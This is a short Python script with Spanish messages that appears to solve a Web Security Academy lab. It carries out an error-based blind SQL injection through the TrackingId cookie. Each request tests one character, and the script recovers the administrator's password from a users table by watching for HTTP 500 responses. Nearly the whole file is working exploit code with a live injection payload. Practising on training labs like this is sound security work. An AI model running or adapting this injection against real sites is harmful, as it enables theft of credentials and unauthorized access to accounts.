#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import signal
import sys
import string
import time

def def_handler(sig, frame):
  p1.failure("Ataque de fuerza bruta detenido")
  print(colored(f"\n[!] Saliendo...\n", 'red'))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQLI")

def makeSQLI():
  
  p1.status("Iniciando ataque de fuerza bruta")
  time.sleep(2)

  password = ""

  p2 = log.progress("Password")
  
  for position in range(1,21):
    for character in characters:
      cookies = {
        "TrackingId" : f"dHXfppnTpmR6sxHe'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
        "session" : "yV7K6NiYR2HHnjw1P0FLgd71cOeUP1wM"
      }

      p1.status(cookies["TrackingId"])

      r = requests.get("https://0a680036045dfa4f80c60822001300b3.web-security-academy.net", cookies=cookies)

      if r.status_code == 500:
        password += character
        p2.status(password)
        break

if __name__ == '__main__':
 
  makeSQLI()
